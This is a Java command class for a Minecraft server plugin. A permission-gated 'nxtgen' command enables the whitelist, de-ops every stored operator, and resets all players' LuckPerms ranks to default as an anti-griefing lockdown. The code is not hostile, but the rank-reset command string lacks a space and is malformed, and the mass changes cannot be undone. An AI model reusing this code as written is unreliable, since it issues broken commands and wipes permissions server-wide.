package me.NxtGen.net.Command;


import me.NxtGen.net.Main;
import net.luckperms.api.LuckPerms;
import net.luckperms.api.LuckPermsProvider;
import net.luckperms.api.event.LuckPermsEvent;
import org.Hackerguardian.HG.Report.MySQL;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Set;




public class NxtGenCommand implements CommandExecutor {
    Main main = JavaPlugin.getPlugin(Main.class);

    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (label.equalsIgnoreCase("nxtgen")) {
            if (sender instanceof Player) {
                //player
                Player p1 = (Player) sender;
                //Withlistedplayers
                if (p1.hasPermission("nxtgen.use")) {


                    p1.sendMessage(ChatColor.GOLD + "Køre nu SAFE PROGRAM YOU CANT STOP IT! ");

                    Bukkit.setWhitelist(true); //enable whitelist
                    p1.sendMessage(ChatColor.GOLD + "WHITELIST ON ");
                    p1.sendMessage("Gonna deop all");
                    MySQL.getallfromOPDatabase();
                    for (byte b = 0; b < MySQL.oplist2.size(); b++)
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "deop " + MySQL.oplist2.get(b));
                    p1.sendMessage("Gonna Whitelist add player");
                    for (byte c = 0; c < main.getConfig().getStringList("Whitelist").size(); c++)
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "whitelist add " + main.getConfig().getStringList("Whitelist").get(c));
                    p1.sendMessage("Gonna remove all ranks from people");
                    for (byte h = 0; h < MySQL.PList2.size(); h++)
                         Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + MySQL.PList2.get(h) + "parent set default");
                    p1.sendMessage("Done all set to default so fuck off");
                    p1.sendMessage("Gonna go restart");
                    //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
                    return true;
                }
            }

        }
        else {
            //console
            sender.sendMessage("hey console");
            return true;
        }
        return false;
    }
}